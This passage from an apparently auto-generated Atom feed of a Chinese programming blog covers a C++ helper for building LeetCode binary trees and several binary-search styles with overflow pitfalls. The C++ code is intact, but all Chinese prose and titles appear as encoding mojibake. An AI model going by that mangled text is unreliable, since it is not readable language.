keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>lChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>fNode<span class="token operator">-></span>left <span class="token operator">=</span> lChild<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>lChild<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>idx<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> rChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>rChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>fNode<span class="token operator">-></span>right <span class="token operator">=</span> rChild<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>rChild<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>idx<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> root<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>ä½¿ç”¨çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œç”±äºä¸¤ä¸ªæ–¹æ³•éƒ½æ˜¯ TreeNode ç±»ä¸­çš„é™æ€æ–¹æ³•ï¼Œå¯ä½¿ç”¨ <code>::</code> ç¬¦å¯¹å…¶è¿›è¡Œè°ƒç”¨ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> order <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token class-name">TreeNode</span><span class="token double-colon punctuation">::</span><span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TreeNode</span><span class="token double-colon punctuation">::</span><span class="token function">orderTraversalWithNull</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨ LeetCode åˆ·é¢˜è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™é‡åˆ°ä¸€äº›éš¾ä»¥éš¾ä»¥ç›´æ¥è§‚å¯Ÿå‡ºæ¥çš„é”™è¯¯ï¼Œæ­¤æ—¶é€šå¸¸æƒ³è¦åˆ©ç”¨å•æ­¥è°ƒè¯•æ¥è§£å†³ï¼Œä½†å¥ˆä½•åªæœ‰ LeetCode Plus ä¼šå‘˜æ‰å¯ä»¥ä½¿ç”¨å…¶ç½‘é¡µçš„è°ƒè¯•åŠŸèƒ½ã€‚å¥½åœ¨ç»å¤§éƒ¨åˆ†æœ¬åœ° IDE éƒ½å…·å¤‡ååˆ†å¼ºå¤§çš„è°ƒè¯•åŠŸèƒ½ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è‡ªå·±çš„è§£é¢˜ä»£ç å¤åˆ¶åˆ°æœ¬åœ°ï¼Œå¹¶ç¼–å†™ç®€å•çš„æµ‹è¯•ç¨‹åºå³å¯ã€‚ä½†æ˜¯å¯¹äºäºŒå‰æ ‘ç›¸å…³çš„é¢˜ï¼Œæµ‹è¯•æ•°æ®çš„ç¼–å†™æ˜¾å¾—ä¸é‚£ä¹ˆå®¹æ˜“ï¼Œæœ¬æ–‡ç¼–å†™äº†ä¸€ä¸ªåŒ¹é… LeetCode é¢˜ç›®ä¸­çš„äºŒå‰æ ‘å®šä¹‰çš„ç±»ï¼Œè¯¥ç±»åŒ…å«ä¸€äº›åŸºæœ¬çš„é™æ€å‡½æ•°ï¼Œèƒ½å¤Ÿå¾ˆæ–¹ä¾¿åœ°å®ç°äºŒå‰æ ‘çš„æ„é€ å’ŒäºŒå‰æ ‘çš„éå†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ•°æ®ç»“æ„ä¸ç®—æ³•" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="ç®—æ³•" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="æ•°æ®ç»“æ„" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>äºŒåˆ†æœç´¢çš„å‡ ç§å†™æ³•ä¸å¸¸è§é—®é¢˜</title>
    <link href="http://lordaeronesz.github.io/2023/09/17/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
    <id>http://lordaeronesz.github.io/2023/09/17/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</id>
    <published>2023-09-17T01:03:08.000Z</published>
    <updated>2023-09-18T03:52:28.364Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨æ¯”èµ›å’Œåˆ·é¢˜çš„æ—¶å€™ç»å¸¸é‡åˆ°äºŒåˆ†ç­”æ¡ˆçš„é¢˜ï¼Œä½†æ—¶ä¸æ—¶ä¼šå› ä¸ºä¸€äº›ç»†èŠ‚ä¸Šçš„é”™è¯¯è€Œæµªè´¹æ—¶é—´ï¼Œæœ¬æ–‡æ—¨åœ¨æ•´ç†å¸¸è§çš„äºŒåˆ†æœç´¢çš„å†™æ³•ã€äºŒåˆ†æœç´¢å¯èƒ½ä¼šé‡åˆ°çš„ä¸€äº›å°é—®é¢˜ï¼Œä»¥åŠ <em>C++</em> ä¸­ä¸äºŒåˆ†æœç´¢ç›¸å…³çš„åº“å‡½æ•°ï¼Œä»¥å…ä»Šåå†çŠ¯ç±»ä¼¼çš„é”™è¯¯ã€‚</p><span id="more"></span><h1 id="äºŒåˆ†æœç´¢çš„å†™æ³•"><a href="#äºŒåˆ†æœç´¢çš„å†™æ³•" class="headerlink" title="äºŒåˆ†æœç´¢çš„å†™æ³•"></a>äºŒåˆ†æœç´¢çš„å†™æ³•</h1><h2 id="æŸ¥æ‰¾æŸä¸ªå€¼çš„ä¸‹æ ‡"><a href="#æŸ¥æ‰¾æŸä¸ªå€¼çš„ä¸‹æ ‡" class="headerlink" title="æŸ¥æ‰¾æŸä¸ªå€¼çš„ä¸‹æ ‡"></a>æŸ¥æ‰¾æŸä¸ªå€¼çš„ä¸‹æ ‡</h2><p>å®šä¹‰å‡½æ•° <code>binarySearch(nums, target)</code> ä¸ºæœç´¢æœ‰åºæ•°ç»„ <em>nums</em> ä¸­æ˜¯å¦å­˜åœ¨ <em>i</em> ä½¿å¾— <code>nums[i] == target</code>ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å› <em>i</em>ï¼Œå¦åˆ™è¿”å› <em>-1</em>.</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™åº”è¯¥æ˜¯å¤§éƒ¨åˆ†äººæœ€æ—©æ¥è§¦çš„äºŒåˆ†å½¢å¼ï¼Œä¹Ÿæ˜¯æœ€ç®€å•ã€æœ€å¥½ç†è§£çš„äºŒåˆ†å†™æ³•ï¼Œä½†å¦‚æœ <em>nums</em> ä¸­å…ƒç´ å­˜åœ¨é‡å¤çš„æƒ…å†µï¼Œå¹¶ä¸”æˆ‘ä»¬éœ€è¦åœ¨ <em>nums</em> ä¸­å­˜åœ¨å¤šä¸ª <em>i</em> ä½¿å¾— <code>nums[i] == target</code> æ—¶è¿”å›æœ€å°çš„ <em>i</em>ï¼Œè¿™ç§å†™æ³•å°±å¤±æ•ˆäº†ï¼Œè€Œè¿™ç§æƒ…å†µå¾€å¾€å°±æ˜¯è§£å†³å¤§éƒ¨åˆ†æœ‰å…³äºŒåˆ†æœç´¢çš„ç®—æ³•é—®é¢˜æ—¶ä¼šé‡åˆ°çš„ã€‚</p><h2 id="æŸ¥æ‰¾å·¦è¾¹ç•Œ"><a href="#æŸ¥æ‰¾å·¦è¾¹ç•Œ" class="headerlink" title="æŸ¥æ‰¾å·¦è¾¹ç•Œ"></a>æŸ¥æ‰¾å·¦è¾¹ç•Œ</h2><p>è¦æƒ³æˆåŠŸå®ç°å¯¹è¾¹ç•Œçš„æŸ¥æ‰¾ï¼Œå°±éœ€è¦å¯¹äºŒåˆ†æœç´¢çš„è¿‡ç¨‹æœ‰ä¸€ä¸ªæ›´ä¸ºæ·±å…¥çš„ç†è§£ã€‚è¿˜æ˜¯é‡‡ç”¨ä¸ä¸Šé¢ç±»ä¼¼çš„å†™æ³•ï¼Œåˆå§‹æ—¶å°†åŒºé—´å·¦å³è¾¹ç•Œåˆå§‹åŒ–ä¸º <code>low = 0, high = n - 1;</code>. åœ¨å®šä¹‰å·¦å³è¾¹ç•Œæ—¶æˆ‘ä»¬åº”è¯¥æ³¨æ„åˆ°ï¼Œå¾…æœç´¢çš„åŒºé—´èŒƒå›´ä¸º <em>low</em> å’Œ <em>high</em>ï¼Œä½†æ˜¯ç”±äº <em>low</em> å’Œ <em>high</em> æœ¬èº«å°±æœ‰å¯èƒ½ä¸ºæ‰€è¦æŸ¥æ‰¾çš„æœ€ç»ˆç»“æœ <em>i</em>ï¼Œå› æ­¤æœç´¢ç›®æ ‡ä½äº<strong>é—­åŒºé—´</strong> [<em>low</em>, <em>high</em>] å†…ï¼Œå®é™…ä¸ŠåŒºé—´å†…çš„æ•°æ®åˆ†å¸ƒæƒ…å†µæˆ‘ä»¬æ˜¯ä¸å¾—è€ŒçŸ¥çš„ï¼Œè€Œæˆ‘ä»¬å·²ç»è·å–çš„ä¿¡æ¯å…¶å®æ˜¯åŒºé—´å¤–çš„ä¿¡æ¯ï¼Œå³ï¼š</p><ul><li>å½“ <code>i &lt;= low - 1</code> æ—¶ï¼Œ<code>nums[i] &lt; target</code>.</li><li>å½“ <code>i &gt;= high + 1</code> æ—¶ï¼Œ<code>nums[i] &gt;= target</code>.</li></ul><p>ä»¥ä¸Šä¿¡æ¯å³ä¸ºäºŒåˆ†æœç´¢è¿‡ç¨‹ä¸­çš„<strong>å¾ªç¯ä¸å˜é‡</strong>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ <em>low</em> å’Œ <em>high</em> æœ¬èº«å°±ä½äºå·¦å³è¾¹ç•Œçš„æƒ…å†µä¸‹ï¼Œ <em>low - 1</em> å’Œ <em>high + 1</em> å·²ç»è¶…å‡ºæ•°ç»„èŒƒå›´ï¼Œä½†ç”±äº <em>nums</em> æ˜¯ä¸€ä¸ªæœ‰åºæ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·è€ƒè™‘ï¼š<code>nums[-1] = -âˆ, nums[n] = +âˆ</code>. å› æ­¤ä¸Šè¿°çš„å¾ªç¯ä¸å˜é‡åœ¨äºŒåˆ†æœç´¢å¼€å§‹æ—¶ä¹Ÿæ»¡è¶³ã€‚è€Œè¦ä½¿å¾—å¾ªç¯ä¸å˜é‡åœ¨æ•´ä¸ªäºŒåˆ†æœç´¢è¿‡ç¨‹ä¸­å‡æ»¡è¶³ï¼Œå°±éœ€è¦åœ¨å¾—åˆ°åŒºé—´ä¸­ç‚¹ <em>mid</em> åï¼Œä¸¥æ ¼æŒ‰ç…§ä¸Šè¿°è§„åˆ™æ¥æ›´æ–°åŒºé—´å·¦å³ç«¯ç‚¹ï¼š</p><ul><li>å½“ <code>nums[mid] &gt;= target</code> æ—¶ï¼Œè¦ä½¿å¾— <code>nums[high + 1] &gt;= target</code>ï¼Œé‚£ä¹ˆå¯ä»¤ <code>high + 1 = mid</code>ï¼Œç­‰ä»·äº <code>high = mid - 1</code>.</li><li>å½“ <code>nums[mid] &lt; target</code> æ—¶ï¼Œè¦ä½¿å¾— <code>nums[low - 1] &lt; target</code>ï¼Œä»¤ <code>low - 1 = mid</code>ï¼Œç­‰ä»·äº <code>low = mid + 1</code>.</li></ul><p>æœ€ç»ˆï¼Œå¾ªç¯æ¡ä»¶ä¸ºè¯¥é—­åŒºé—´ä¸ä¸ºç©ºï¼Œè¡¨ç¤ºä»ç„¶å­˜åœ¨æœªç¡®å®šçš„åŒºé—´å¤–ä¿¡æ¯ï¼Œå³  <code>low &lt;= high</code>ï¼ˆå–ç­‰å·æ˜¯å› ä¸ºå½“ <code>low == high</code> æ—¶ï¼Œé—­åŒºé—´å†…ä»ç„¶æœ‰ä¸€ä¸ªå…ƒç´ ï¼Œåº”è¯¥ç»§ç»­å¾ªç¯ï¼‰ï¼Œå½“é€€å‡ºå¾ªç¯æ—¶æ»¡è¶³ <code>low == high + 1</code>ï¼Œæ­¤æ—¶æ ¹æ®ä¸Šè¿°çš„å¾ªç¯ä¸å˜é‡å¯çŸ¥ï¼Œ<code>nums[low - 1] == nums[high] &lt; target</code>ï¼Œ<code>nums[high + 1] == nums[low] &gt;= target</code>ï¼Œå³ <code>nums[low]</code> ä¸ºæœ‰åºæ•°ç»„ <em>nums</em> ä¸­ç¬¬ä¸€ä¸ªå¤§äºç­‰äº <em>target</em> çš„å€¼ã€‚</p><p>ä¾æ®ä»¥ä¸ŠåŒºé—´è¾¹ç•Œåˆå§‹åŒ–æ–¹æ³•ã€è¾¹ç•Œæ›´æ–°æ–¹æ³•ä»¥åŠæœ€ç»ˆçš„è¿”å›å€¼ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°ç¼–å†™ç›¸åº”ä»£ç ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// é—­åŒºé—´å‹</span><span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> low<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å½“ç„¶ï¼Œé™¤äº†ä»¥ä¸Šâ€œé—­åŒºé—´å‹â€å†™æ³•å¤–ï¼Œè¿˜æœ‰â€œå·¦é—­å³å¼€å‹â€œå’Œå¼€åŒºé—´å‹ï¼Œè¿™äº›å†™æ³•çš„æœ¬è´¨æ€æƒ³æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œåªä¸è¿‡æ˜¯é€‰å–çš„å¾ªç¯ä¸å˜é‡ä¸åŒã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// å·¦é—­å³å¼€å‹</span><span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å·¦é—­å³å¼€åŒºé—´å½“ low == high æ—¶å°±å·²ä¸ºç©º</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// å¾ªç¯ä¸å˜é‡</span><span class="token comment">// nums[high] >= target</span><span class="token comment">// nums[low - 1] &lt; target</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> low<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// å¼€åŒºé—´å‹</span><span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å¼€åŒºé—´å½“ low + 1 == high æ—¶å°±å·²ä¸ºç©º</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// å¾ªç¯ä¸å˜é‡</span><span class="token comment">// nums[high] >= target</span><span class="token comment">// nums[low] &lt; target</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> high<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="æŸ¥æ‰¾å³è¾¹ç•Œ"><a href="#æŸ¥æ‰¾å³è¾¹ç•Œ" class="headerlink" title="æŸ¥æ‰¾å³è¾¹ç•Œ"></a>æŸ¥æ‰¾å³è¾¹ç•Œ</h2><p>è¦å¯¹å³è¾¹ç•Œè¿›è¡ŒæŸ¥æ‰¾ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡æ”¹å†™å¾ªç¯ä¸å˜é‡æ¥å®ç°ã€‚ä¸è¿‡é€šå¸¸å¯¹äºå…ƒç´ ç±»å‹ä¸ºæ•´å‹çš„æœ‰åºæ•°ç»„æ¥è¯´ï¼Œå¯¹å³è¾¹ç•Œçš„æŸ¥æ‰¾å¯ä»¥è½¬åŒ–ä¸ºå¯¹å·¦è¾¹ç•Œçš„æŸ¥æ‰¾ã€‚</p><p>æ¯”å¦‚è¦æŸ¥æ‰¾æ•´å‹æœ‰åºæ•°ç»„ nums ä¸­æœ€å°çš„ <em>i</em> æ»¡è¶³ <code>nums[i] &gt; target</code>ï¼Œè®°ä¸º <code>upper_bound(nums, target)</code>ï¼Œç”±äºå¯¹äºæ•´å‹æ¥è¯´ï¼Œ<code>nums[i] &gt; target</code> ä¸ <code>nums[i] &gt;= target + 1</code> ç­‰ä»·ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æŸ¥æ‰¾æœ€å°çš„ <em>i</em> æ»¡è¶³ <code>nums[i] &gt;= target + 1</code> ï¼Œå¾—åˆ°çš„ <em>i</em> å³ä¸ºæœ€å°çš„ <em>i</em> æ»¡è¶³ <code>nums[i] &gt; target</code>ï¼Œå³ <code>upper_bound(nums, target) = lower_bound(nums, target + 1)</code>.</p><p>åŒæ ·çš„ï¼Œè¯¸å¦‚ <code>nums[i] &lt; target</code>ã€<code>nums[i] &lt;= target</code> ç­‰ç­‰é—®é¢˜éƒ½å¯ä»¥é€šè¿‡ç±»ä¼¼çš„æ€æƒ³è¿›è¡Œç­‰ä»·ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°ã€‚</p><h1 id="å¸¸è§çš„é—®é¢˜"><a href="#å¸¸è§çš„é—®é¢˜" class="headerlink" title="å¸¸è§çš„é—®é¢˜"></a>å¸¸è§çš„é—®é¢˜</h1><p>åœ¨é‡‡ç”¨äºŒåˆ†ç­”æ¡ˆæ³•è§£å†³ä¸€äº›æœ€ä¼˜åŒ–é—®é¢˜æ—¶ï¼Œä¸Šä¸‹ç•Œçš„ç¡®å®šå¾€å¾€æ˜¯æ¯”è¾ƒå›°éš¾å’Œç¹ççš„ã€‚ä½†ç”±äºè¿›è¡Œä¸€æ¬¡äºŒåˆ†æœç´¢çš„æ—¶é—´å¤æ‚åº¦ä¸º <em>O(logn)<em>ï¼Œ</em>n</em> çš„å¤§å°å¯¹æœ€ç»ˆæ—¶é—´çš„å½±å“ä¸ä¼šå¾ˆå¤§ï¼Œå› æ­¤å®é™…é¢å¯¹è¿™äº›é—®é¢˜æ—¶ï¼Œå¾€å¾€ç›´æ¥ä»¤ä¸‹ç•Œä¸º <code>low = 0, high = INT32_MAX</code>ï¼Œä½†æ˜¯è¿™æ ·åˆå¾ˆå®¹æ˜“å‡ºç°<strong>æ•´å‹æº¢å‡º</strong>çš„é—®é¢˜ï¼Œå°¤å…¶æ˜¯é‡‡ç”¨ <code>mid = (low + high) / 2</code> è¿™ç§å†™æ³•çš„æƒ…å†µä¸‹ï¼Œè™½ç„¶ <em>low</em> å’Œ <em>high</em> çš„å€¼å‡ä½äº [<em>0, INT32_MAX</em>] ä¹‹é—´ï¼Œä½† <em>low + high</em> å´å¯èƒ½å¤§äº <em>INT32_MAX</em>ï¼Œä»è€Œå¯¼è‡´ä¸€äº›æ„æ–™ä¸åˆ°çš„é”™è¯¯å‡ºç°ã€‚å› æ­¤æ±‚åŒºé—´ä¸­å€¼æ¯”è¾ƒå¥½çš„å†™æ³•æ˜¯ <code>mid = low + (high - low) / 2</code>ï¼Œå…¶åœ¨æ•°å­¦ä¸Šä¸ä¸Šè¿°è®¡ç®—æ–¹å¼ç­‰ä»·ï¼Œä½†å´å¯ä»¥å¾ˆå¥½åœ°è§„é¿æ‰æ•´å‹æº¢å‡ºçš„é—®é¢˜ã€‚</p><p>æ­¤å¤–ï¼Œæœ‰äº›é—®é¢˜è¿˜éœ€è¦ <em>mid</em> å‚ä¸ä¸€äº›è¿ç®—ï¼Œæ¥è¿›è¡Œè¯¥é—®é¢˜çš„æœ€ä¼˜åŒ–åˆ¤å®šï¼Œè¿™æ—¶ä¸€ä¸ªæ¥è¿‘æº¢å‡ºçš„æ•´æ•°åœ¨è¿›è¡Œä¸€äº›åŠ æ³•æˆ–ä¹˜æ³•è¿ç®—åå¾ˆå®¹æ˜“å› æ­¤æº¢å‡ºã€‚å› æ­¤ä¸€ä¸ªæ¯”è¾ƒå®‰å…¨çš„åšæ³•æ˜¯å°†åŒºé—´ä¸Šä¸‹ç•Œä»¥åŠåŒºé—´ä¸­å€¼éƒ½å®šä¹‰ä¸º <em>64</em> ä½æ•´å‹ï¼ˆ<em>C++</em> ä¸­ä¸º <em>long long</em> ç±»å‹ï¼‰ã€‚</p><h1 id="ç›¸å…³åº“å‡½æ•°"><a href="#ç›¸å…³åº“å‡½æ•°" class="headerlink" title="ç›¸å…³åº“å‡½æ•°"></a>ç›¸å…³åº“å‡½æ•°</h1><ul><li><code>lower_bound(first, last, value, comp);</code></li></ul><p><em>first, last</em> ä¸ºæœç´¢æ•°ç»„çš„å·¦é—­å³å¼€åŒºé—´ï¼Œé€šå¸¸ç›´æ¥å– <code>first = nums.begin(), last = nums.end()</code> ï¼Œ<em>value</em> ä¸ºè¦ä¸å…ƒç´ æ¯”è¾ƒçš„å€¼ï¼Œ<em>comp</em> 